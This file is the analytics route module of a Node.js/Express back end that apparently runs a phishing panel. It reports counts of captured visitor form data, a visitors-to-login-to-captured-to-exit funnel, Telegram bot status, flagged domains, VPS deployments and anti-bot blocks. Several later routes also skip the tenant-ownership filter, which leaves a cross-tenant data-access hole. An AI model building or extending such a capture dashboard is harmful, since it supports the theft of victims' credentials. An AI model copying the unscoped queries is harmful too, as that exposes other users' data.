const router = require('express').Router();
const { getAdapter } = require('../database/adapter');
const { authenticateToken } = require('../middleware/auth');

// Apply auth to all analytics routes
router.use(authenticateToken);

/**
 * Build a website filter for analytics queries.
 *  - Unrestricted (god without ?as_user): no restriction, only the requested
 *    website_id (if any).
 *  - Scoped (non-god or god impersonating): filter by ownership via a
 *    subquery against websites.owner_id.
 * Returns { clause: 'AND col ...', params: [] } — always AND-safe.
 */
function buildWebsiteFilter(req, column = 'website_id') {
  const requested = req.query && req.query.website_id
    ? parseInt(req.query.website_id, 10) : null;
  const uid = req && req.effectiveUserId;

  if (uid == null) {
    if (Number.isFinite(requested)) {
      return { clause: `AND ${column} = ?`, params: [requested] };
    }
    return { clause: '', params: [] };
  }

  if (Number.isFinite(requested)) {
    // Filter to the requested site AND enforce ownership.
    return {
      clause: `AND ${column} = ? AND ${column} IN (SELECT id FROM websites WHERE owner_id = ?)`,
      params: [requested, uid],
    };
  }
  return {
    clause: `AND ${column} IN (SELECT id FROM websites WHERE owner_id = ?)`,
    params: [uid],
  };
}

/**
 * Helper: build a date filter clause for a column.
 * Supports: today, yesterday, 7d, 30d, 90d, or custom from/to ISO dates.
 */
function buildDateFilter(query, column) {
  const { range, from, to } = query;
  let clause = '';
  const params = [];

  switch (range) {
    case 'today':
      clause = `AND ${column} >= CURRENT_DATE`;
      break;
    case 'yesterday':
      clause = `AND ${column} >= (CURRENT_DATE - INTERVAL '1 day') AND ${column} < CURRENT_DATE`;
      break;
    case '7d':
      clause = `AND ${column} >= (CURRENT_TIMESTAMP - INTERVAL '7 days')`;
      break;
    case '30d':
      clause = `AND ${column} >= (CURRENT_TIMESTAMP - INTERVAL '30 days')`;
      break;
    case '90d':
      clause = `AND ${column} >= (CURRENT_TIMESTAMP - INTERVAL '90 days')`;
      break;
    case 'custom':
      if (from) {
        clause += ` AND ${column} >= ?`;
        params.push(from);
      }
      if (to) {
        clause += ` AND ${column} <= ?`;
        params.push(to);
      }
      break;
    default:
      clause = `AND ${column} >= CURRENT_DATE`;
      break;
  }

  return { clause, params };
}

// ─── GET /dashboard ─────────────────────────────────────────────────────────────
router.get('/dashboard', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id, range = 'today' } = req.query;

    // Multi-tenant scope: intersect any explicit website_id with the caller's
    // assigned websites (god sees all).
    const _wf = buildWebsiteFilter(req, 'website_id');
    const websiteFilter = _wf.clause;
    const websiteParams = _wf.params;

    // Scope for queries that count `websites` (or child tables joined by
    // website_id). Empty for unrestricted god; " AND owner_id = ?" for a
    // scoped caller. Kept separate from websiteFilter — which filters by
    // website_id — because we need to filter by websites.owner_id here.
    const { scopeSqlClause, scopeByWebsite } = require('../middleware/scope');
    const ownerScope = scopeSqlClause(req, 'owner_id');
    const afOwnerScope = scopeSqlClause(req, 'af.owner_id');

    // Date filters for sessions and page views
    const dateFilterPV = buildDateFilter(req.query, 'timestamp');
    const dateFilterSessions = buildDateFilter(req.query, 'started_at');

    // Website filter with `s.` alias for JOINs (funnel queries)
    const _wfS = buildWebsiteFilter(req, 's.website_id');
    const websiteFilterS = _wfS.clause;
    const websiteParamsS = _wfS.params;

    // Run all stat queries in parallel
    const [activeRow, pvRow, avgRow, webStatsRow, domainsRow, pagesRow, tgRow,
           vpsCountRow, vpsAttachedRow, flaggedRow, downRow, capturesTodayRow,
           deploysTodayRow, sessionsTodayRow, loginHitsRow, exitHitsRow,
           topCountriesRows, recentCapturesRows, botsBlockedRow] = await Promise.all([
      // Active sessions now
      db.get(`SELECT COUNT(*) as count FROM sessions WHERE is_active = 1 ${websiteFilter}`, websiteParams),
      // Page views in range
      db.get(`SELECT COUNT(*) as count FROM page_views WHERE 1=1 ${dateFilterPV.clause} ${websiteFilter}`, [...dateFilterPV.params, ...websiteParams]),
      // Avg session duration
      db.get(`SELECT AVG((julianday(COALESCE(last_activity, started_at)) - julianday(started_at)) * 86400) as avg_seconds FROM sessions WHERE 1=1 ${dateFilterSessions.clause} ${websiteFilter}`, [...dateFilterSessions.params, ...websiteParams]),
      // Website breakdown: total / live / offline — scoped by owner_id.
      db.get(
        `SELECT COUNT(*) as total,
                COUNT(CASE WHEN is_active = 1 THEN 1 END) as live,
                COUNT(CASE WHEN is_active = 0 THEN 1 END) as offline
         FROM websites WHERE 1=1 ${ownerScope.clause}`,
        ownerScope.params
      ),
      // Active custom domains (primary domain routing enabled)
      db.get(
        `SELECT COUNT(*) as count FROM websites
         WHERE domain_active = 1 AND domain IS NOT NULL AND domain != '' ${ownerScope.clause}`,
        ownerScope.params
      ),
      // Total demo pages — scoped via websites.owner_id.
      db.get(
        `SELECT COUNT(*) as count FROM demo_pages
         WHERE website_id IN (SELECT id FROM websites WHERE 1=1 ${ownerScope.clause})`,
        ownerScope.params
      ),
      // Telegram bots configured and active
      db.get(
        `SELECT COUNT(*) as count FROM websites WHERE tg_bot_active = 1 ${ownerScope.clause}`,
        ownerScope.params
      ),
      // VPS registered
      db.get(`SELECT COUNT(*) as count FROM vpses WHERE 1=1 ${ownerScope.clause}`, ownerScope.params),
      // VPSes with websites attached
      db.get(
        `SELECT COUNT(DISTINCT vps_id) as count FROM websites
         WHERE vps_id IS NOT NULL ${ownerScope.clause}`,
        ownerScope.params
      ),
      // Flagged domains (needing action)
      db.get(`SELECT COUNT(*) as count FROM domains WHERE flagged = 1 ${ownerScope.clause}`, ownerScope.params),
      // Domains marked down by uptime monitor
      db.get(`SELECT COUNT(*) as count FROM domains WHERE uptime_ok = 0 ${ownerScope.clause}`, ownerScope.params),
      // Captures today
      db.get(
        `SELECT COUNT(*) as count FROM activity_feed
         WHERE type = 'formdata' AND timestamp >= CURRENT_DATE ${ownerScope.clause}`,
        ownerScope.params
      ),
      // Deploys today
      db.get(
        `SELECT COUNT(*) as count FROM activity_feed
         WHERE type IN ('deploy','deploy_success','deploy_failed','vps') AND timestamp >= CURRENT_DATE ${ownerScope.clause}`,
        ownerScope.params
      ),
      // Sessions today (for funnel)
      db.get(`SELECT COUNT(*) as count FROM sessions WHERE started_at >= CURRENT_DATE ${websiteFilter}`, websiteParams),
      // Reached login (for funnel)
      db.get(
        `SELECT COUNT(DISTINCT s.id) as count FROM sessions s
         WHERE s.started_at >= CURRENT_DATE
           AND (s.current_page ILIKE '%login%' OR EXISTS (
             SELECT 1 FROM page_views pv WHERE pv.session_id = s.id AND pv.page_url ILIKE '%login%'
           )) ${websiteFilterS}`,
        websiteParamsS
      ),
      // Reached exit (for funnel)
      db.get(
        `SELECT COUNT(DISTINCT s.id) as count FROM sessions s
         WHERE s.started_at >= CURRENT_DATE
           AND (s.current_page ILIKE '%exit%' OR EXISTS (
             SELECT 1 FROM page_views pv WHERE pv.session_id = s.id AND pv.page_url ILIKE '%exit%'
           )) ${websiteFilterS}`,
        websiteParamsS
      ),
      // Top countries today
      db.all(
        `SELECT country, COUNT(*) as count FROM sessions
         WHERE started_at >= CURRENT_DATE AND country IS NOT NULL AND country != '' ${websiteFilter}
         GROUP BY country ORDER BY count DESC LIMIT 5`,
        websiteParams
      ),
      // Recent captures (last 5)
      db.all(
        `SELECT af.id, af.timestamp, af.details, af.website_id, af.session_id,
                w.name AS website_name, w.color AS website_color
         FROM activity_feed af
         LEFT JOIN websites w ON w.id = af.website_id
         WHERE af.type = 'formdata' ${afOwnerScope.clause}
         ORDER BY af.timestamp DESC LIMIT 5`,
        afOwnerScope.params
      ),
      // Bots blocked today (from activity feed if logged)
      db.get(
        `SELECT COUNT(*) as count FROM activity_feed
         WHERE type IN ('bot_blocked','antibot_block','ip_ban') AND timestamp >= CURRENT_DATE ${ownerScope.clause}`,
        ownerScope.params
      ),
    ]);

    const activeSessions      = activeRow    ? activeRow.count      : 0;
    const pageViewsToday      = pvRow        ? pvRow.count          : 0;
    const avgDuration         = avgRow       ? (avgRow.avg_seconds  || 0) : 0;
    const totalWebsites       = webStatsRow  ? webStatsRow.total    : 0;
    const liveWebsites        = webStatsRow  ? webStatsRow.live     : 0;
    const offlineWebsites     = webStatsRow  ? webStatsRow.offline  : 0;
    const activeCustomDomains = domainsRow   ? domainsRow.count     : 0;
    const totalDemoPages      = pagesRow     ? pagesRow.count       : 0;
    const tgBotsCount         = tgRow        ? tgRow.count          : 0;
    const activeWebsites      = liveWebsites;
    const totalVpses          = vpsCountRow    ? vpsCountRow.count    : 0;
    const attachedVpses       = vpsAttachedRow ? vpsAttachedRow.count : 0;
    const flaggedDomains      = flaggedRow     ? flaggedRow.count     : 0;
    const downDomains         = downRow        ? downRow.count        : 0;
    const capturesToday       = capturesTodayRow ? capturesTodayRow.count : 0;
    const deploysToday        = deploysTodayRow  ? deploysTodayRow.count  : 0;
    const sessionsToday       = sessionsTodayRow ? sessionsTodayRow.count : 0;
    const loginHitsToday      = loginHitsRow     ? loginHitsRow.count     : 0;
    const exitHitsToday       = exitHitsRow      ? exitHitsRow.count      : 0;
    const botsBlockedToday    = botsBlockedRow   ? botsBlockedRow.count   : 0;

    const topCountries = (topCountriesRows || []).map(r => ({
      country: r.country, count: r.count || 0
    }));

    const recentCaptures = (recentCapturesRows || []).map(r => {
      let fieldNames = [];
      let page = '';
      try {
        const d = typeof r.details === 'string' ? JSON.parse(r.details) : (r.details || {});
        page = d.page || '';
        fieldNames = d.fields ? Object.keys(d.fields).filter(k => !['page','formid','formaction'].includes(k.toLowerCase())) : [];
      } catch {}
      return {
        id: r.id, timestamp: r.timestamp, session_id: r.session_id,
        website_id: r.website_id, website_name: r.website_name,
        website_color: r.website_color, page, fields: fieldNames
      };
    });

    const isDaily = range === '7d' || range === '30d' || range === '90d' || range === 'custom';
    let sessionsChart = [];

    if (isDaily) {
      const timelineData = await db.all(`
        SELECT strftime('%Y-%m-%d', started_at) as date_str, COUNT(*) as count
        FROM sessions
        WHERE 1=1 ${dateFilterSessions.clause} ${websiteFilter}
        GROUP BY date_str
        ORDER BY date_str ASC
      `, [...dateFilterSessions.params, ...websiteParams]);

      sessionsChart = timelineData.map(d => {
        const label = d.date_str ? d.date_str.slice(5) : '';
        return { label, value: d.count || 0 };
      });
    } else {
      const hourlyData = await db.all(`
        SELECT strftime('%H', started_at) as hour, COUNT(*) as sessions
        FROM sessions
        WHERE started_at >= datetime('now', '-24 hours') ${websiteFilter}
        GROUP BY hour
        ORDER BY hour ASC
      `, websiteParams);

      for (let h = 0; h < 24; h++) {
        const hourStr = h.toString().padStart(2, '0');
        const found = hourlyData.find(d => d.hour === hourStr);
        sessionsChart.push({
          label: `${hourStr}:00`,
          value: found ? found.sessions : 0
        });
      }
    }

    const topPages = await db.all(`
      SELECT page_url as page, COUNT(*) as count
      FROM page_views
      WHERE 1=1 ${dateFilterPV.clause} ${websiteFilter}
      GROUP BY page_url
      ORDER BY count DESC
      LIMIT 5
    `, [...dateFilterPV.params, ...websiteParams]);

    // Scope activity feed and recent sessions by the effective caller.
    // (scopeSqlClause / scopeByWebsite are already required at the top of this handler.)
    const feedScope = scopeSqlClause(req, 'owner_id');
    const activityFeed = await db.all(`
      SELECT id, type, icon, message, timestamp
      FROM activity_feed
      WHERE 1=1${feedScope.clause}
      ORDER BY timestamp DESC
      LIMIT 15
    `, feedScope.params);

    const sessScope = scopeByWebsite(req, 's.website_id');
    const recentSessions = await db.all(`
      SELECT s.*, w.name as website_name
      FROM sessions s
      LEFT JOIN websites w ON s.website_id = w.id
      WHERE 1=1${sessScope.clause}
      ORDER BY s.last_activity DESC
      LIMIT 5
    `, sessScope.params);

    res.json({
      stats: {
        activeSessions,
        pageViewsToday,
        avgDuration: Math.round(avgDuration * 1000),
        activeWebsites,
        totalWebsites,
        liveWebsites,
        offlineWebsites,
        activeCustomDomains,
        totalDemoPages,
        tgBotsCount,
        totalVpses,
        attachedVpses,
        flaggedDomains,
        downDomains,
        capturesToday,
        deploysToday,
        botsBlockedToday,
      },
      funnel: {
        visitors: sessionsToday,
        reachedLogin: loginHitsToday,
        captured: capturesToday,
        reachedExit: exitHitsToday,
      },
      topCountries,
      recentCaptures,
      sessionsChart,
      topPages,
      activityFeed,
      recentSessions
    });
  } catch (err) {
    console.error('Analytics dashboard error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /overview ──────────────────────────────────────────────────────────────
router.get('/overview', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id } = req.query;

    // Multi-tenant scope: intersect any explicit website_id with the caller's
    // assigned websites (god sees all).
    const _wf = buildWebsiteFilter(req, 'website_id');
    const websiteFilter = _wf.clause;
    const websiteParams = _wf.params;

    const sessionsToday = await db.get(`
      SELECT COUNT(*) as count FROM sessions
      WHERE started_at >= CURRENT_DATE ${websiteFilter}
    `, websiteParams);

    const sessionsYesterday = await db.get(`
      SELECT COUNT(*) as count FROM sessions
      WHERE started_at >= (CURRENT_DATE - INTERVAL '1 day')
        AND started_at < CURRENT_DATE ${websiteFilter}
    `, websiteParams);

    const activeSessions = await db.get(`
      SELECT COUNT(*) as count FROM sessions
      WHERE is_active = 1 ${websiteFilter}
    `, websiteParams);

    const pageViewsToday = await db.get(`
      SELECT COUNT(*) as count FROM page_views
      WHERE timestamp >= CURRENT_DATE ${websiteFilter}
    `, websiteParams);

    const pageViewsYesterday = await db.get(`
      SELECT COUNT(*) as count FROM page_views
      WHERE timestamp >= (CURRENT_DATE - INTERVAL '1 day')
        AND timestamp < CURRENT_DATE ${websiteFilter}
    `, websiteParams);

    const avgDuration = await db.get(`
      SELECT AVG((julianday(COALESCE(last_activity, started_at)) - julianday(started_at)) * 86400) as avg_seconds
      FROM sessions
      WHERE started_at >= CURRENT_DATE ${websiteFilter}
    `, websiteParams);

    const topPages = await db.all(`
      SELECT page_url, page_title, COUNT(*) as views
      FROM page_views
      WHERE timestamp >= CURRENT_DATE ${websiteFilter}
      GROUP BY page_url, page_title
      ORDER BY views DESC
      LIMIT 10
    `, websiteParams);

    const hourlyData = await db.all(`
      SELECT strftime('%H', started_at) as hour, COUNT(*) as sessions
      FROM sessions
      WHERE started_at >= datetime('now', '-24 hours') ${websiteFilter}
      GROUP BY hour
      ORDER BY hour ASC
    `, websiteParams);

    const hourlyChart = [];
    for (let h = 0; h < 24; h++) {
      const hourStr = h.toString().padStart(2, '0');
      const found = hourlyData.find(d => d.hour === hourStr);
      hourlyChart.push({
        hour: hourStr,
        label: `${hourStr}:00`,
        sessions: found ? found.sessions : 0
      });
    }

    const uniqueVisitors = await db.get(`
      SELECT COUNT(DISTINCT visitor_id) as count FROM sessions
      WHERE started_at >= CURRENT_DATE ${websiteFilter}
    `, websiteParams);

    const totalSessionsForBounce = await db.get(`
      SELECT COUNT(*) as total FROM sessions
      WHERE started_at >= CURRENT_DATE ${websiteFilter}
    `, websiteParams);

    const bouncedSessions = await db.get(`
      SELECT COUNT(*) as bounced FROM sessions
      WHERE started_at >= CURRENT_DATE
        AND pages_viewed <= 1 ${websiteFilter}
    `, websiteParams);

    const totalB = totalSessionsForBounce ? totalSessionsForBounce.total : 0;
    const bouncedB = bouncedSessions ? bouncedSessions.bounced : 0;
    const bounceRate = totalB > 0 ? Math.round((bouncedB / totalB) * 100) : 0;

    res.json({
      sessions_today: sessionsToday ? sessionsToday.count : 0,
      sessions_yesterday: sessionsYesterday ? sessionsYesterday.count : 0,
      active_sessions: activeSessions ? activeSessions.count : 0,
      page_views_today: pageViewsToday ? pageViewsToday.count : 0,
      page_views_yesterday: pageViewsYesterday ? pageViewsYesterday.count : 0,
      avg_duration_seconds: Math.round((avgDuration ? avgDuration.avg_seconds : 0) || 0),
      unique_visitors: uniqueVisitors ? uniqueVisitors.count : 0,
      bounce_rate: bounceRate,
      top_pages: topPages,
      hourly_chart: hourlyChart
    });
  } catch (err) {
    console.error('Analytics overview error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /pages ─────────────────────────────────────────────────────────────────
router.get('/pages', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id, limit = 50 } = req.query;
    const dateFilter = buildDateFilter(req.query, 'pv.timestamp');

    let websiteFilter = '';
    const allParams = [...dateFilter.params];
    if (website_id) {
      websiteFilter = 'AND pv.website_id = ?';
      allParams.push(parseInt(website_id, 10));
    }

    const limitNum = Math.min(200, Math.max(1, parseInt(limit, 10) || 50));

    const pages = await db.all(`
      SELECT
        pv.page_url,
        pv.page_title,
        COUNT(*) as views,
        COUNT(DISTINCT pv.session_id) as unique_sessions,
        AVG(pv.duration_ms) as avg_duration_ms
      FROM page_views pv
      WHERE 1=1 ${dateFilter.clause} ${websiteFilter}
      GROUP BY pv.page_url, pv.page_title
      ORDER BY views DESC
      LIMIT ?
    `, [...allParams, limitNum]);

    res.json({ pages });
  } catch (err) {
    console.error('Analytics pages error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /referrers ─────────────────────────────────────────────────────────────
router.get('/referrers', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id, limit = 20 } = req.query;
    const dateFilter = buildDateFilter(req.query, 's.started_at');

    let websiteFilter = '';
    const allParams = [...dateFilter.params];
    if (website_id) {
      websiteFilter = 'AND s.website_id = ?';
      allParams.push(parseInt(website_id, 10));
    }

    const limitNum = Math.min(100, Math.max(1, parseInt(limit, 10) || 20));

    const referrers = await db.all(`
      SELECT
        CASE
          WHEN s.referrer IS NULL OR s.referrer = '' THEN 'Direct'
          ELSE s.referrer
        END as referrer,
        COUNT(*) as sessions,
        COUNT(DISTINCT s.visitor_id) as unique_visitors
      FROM sessions s
      WHERE 1=1 ${dateFilter.clause} ${websiteFilter}
      GROUP BY referrer
      ORDER BY sessions DESC
      LIMIT ?
    `, [...allParams, limitNum]);

    res.json({ referrers });
  } catch (err) {
    console.error('Analytics referrers error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /countries ─────────────────────────────────────────────────────────────
router.get('/countries', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id, limit = 30 } = req.query;
    const dateFilter = buildDateFilter(req.query, 's.started_at');

    let websiteFilter = '';
    const allParams = [...dateFilter.params];
    if (website_id) {
      websiteFilter = 'AND s.website_id = ?';
      allParams.push(parseInt(website_id, 10));
    }

    const limitNum = Math.min(100, Math.max(1, parseInt(limit, 10) || 30));

    const countries = await db.all(`
      SELECT
        COALESCE(NULLIF(s.country, ''), 'Unknown') as country,
        COUNT(*) as sessions,
        COUNT(DISTINCT s.visitor_id) as unique_visitors
      FROM sessions s
      WHERE 1=1 ${dateFilter.clause} ${websiteFilter}
      GROUP BY country
      ORDER BY sessions DESC
      LIMIT ?
    `, [...allParams, limitNum]);

    res.json({ countries });
  } catch (err) {
    console.error('Analytics countries error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /devices ───────────────────────────────────────────────────────────────
router.get('/devices', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id } = req.query;
    const dateFilter = buildDateFilter(req.query, 's.started_at');

    let websiteFilter = '';
    const allParams = [...dateFilter.params];
    if (website_id) {
      websiteFilter = 'AND s.website_id = ?';
      allParams.push(parseInt(website_id, 10));
    }

    const browsers = await db.all(`
      SELECT
        COALESCE(NULLIF(s.browser, ''), 'Unknown') as browser,
        COUNT(*) as count
      FROM sessions s
      WHERE 1=1 ${dateFilter.clause} ${websiteFilter}
      GROUP BY browser
      ORDER BY count DESC
    `, allParams);

    const operatingSystems = await db.all(`
      SELECT
        COALESCE(NULLIF(s.os, ''), 'Unknown') as os,
        COUNT(*) as count
      FROM sessions s
      WHERE 1=1 ${dateFilter.clause} ${websiteFilter}
      GROUP BY os
      ORDER BY count DESC
    `, allParams);

    const devices = await db.all(`
      SELECT
        COALESCE(NULLIF(s.device, ''), 'Unknown') as device,
        COUNT(*) as count
      FROM sessions s
      WHERE 1=1 ${dateFilter.clause} ${websiteFilter}
      GROUP BY device
      ORDER BY count DESC
    `, allParams);

    res.json({ browsers, operating_systems: operatingSystems, devices });
  } catch (err) {
    console.error('Analytics devices error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /timeline ──────────────────────────────────────────────────────────────
router.get('/timeline', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id, granularity = 'hourly' } = req.query;
    const dateFilter = buildDateFilter(req.query, 's.started_at');

    let websiteFilter = '';
    const allParams = [...dateFilter.params];
    if (website_id) {
      websiteFilter = 'AND s.website_id = ?';
      allParams.push(parseInt(website_id, 10));
    }

    let groupBy, selectExpr, orderBy;

    if (granularity === 'daily') {
      selectExpr = "strftime('%Y-%m-%d', s.started_at) as period";
      groupBy = "strftime('%Y-%m-%d', s.started_at)";
      orderBy = 'period ASC';
    } else {
      selectExpr = "strftime('%Y-%m-%d %H:00', s.started_at) as period";
      groupBy = "strftime('%Y-%m-%d %H:00', s.started_at)";
      orderBy = 'period ASC';
    }

    const sessions = await db.all(`
      SELECT
        ${selectExpr},
        COUNT(*) as sessions,
        COUNT(DISTINCT s.visitor_id) as unique_visitors
      FROM sessions s
      WHERE 1=1 ${dateFilter.clause} ${websiteFilter}
      GROUP BY ${groupBy}
      ORDER BY ${orderBy}
    `, allParams);

    const pvDateFilter = buildDateFilter(req.query, 'pv.timestamp');
    const pvAllParams = [...pvDateFilter.params];
    let pvWebsiteFilter = '';
    if (website_id) {
      pvWebsiteFilter = 'AND pv.website_id = ?';
      pvAllParams.push(parseInt(website_id, 10));
    }

    let pvGroupBy, pvSelectExpr;
    if (granularity === 'daily') {
      pvSelectExpr = "strftime('%Y-%m-%d', pv.timestamp) as period";
      pvGroupBy = "strftime('%Y-%m-%d', pv.timestamp)";
    } else {
      pvSelectExpr = "strftime('%Y-%m-%d %H:00', pv.timestamp) as period";
      pvGroupBy = "strftime('%Y-%m-%d %H:00', pv.timestamp)";
    }

    const pageViews = await db.all(`
      SELECT
        ${pvSelectExpr},
        COUNT(*) as page_views
      FROM page_views pv
      WHERE 1=1 ${pvDateFilter.clause} ${pvWebsiteFilter}
      GROUP BY ${pvGroupBy}
      ORDER BY period ASC
    `, pvAllParams);

    const pvMap = {};
    pageViews.forEach(pv => { pvMap[pv.period] = pv.page_views; });

    const timeline = sessions.map(s => ({
      period: s.period,
      sessions: s.sessions,
      unique_visitors: s.unique_visitors,
      page_views: pvMap[s.period] || 0
    }));

    res.json({ granularity, timeline });
  } catch (err) {
    console.error('Analytics timeline error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;
